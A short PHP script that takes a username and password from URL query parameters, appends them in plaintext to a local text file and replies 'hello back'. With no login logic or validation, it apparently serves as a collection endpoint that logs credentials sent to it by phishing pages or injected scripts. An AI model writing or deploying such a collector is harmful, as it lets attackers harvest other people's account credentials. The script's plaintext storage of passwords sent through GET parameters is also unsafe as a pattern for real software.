<?php
  $myfile = fopen("./zzz.txt", "a") or die("Unable to open file!");
  $username = $_GET['username'];
  $password = $_GET['password'];
  $content = $username. ":". $password. "\n";
  fwrite($myfile, $content);
  fclose($myfile);
  echo "hello back";
?>
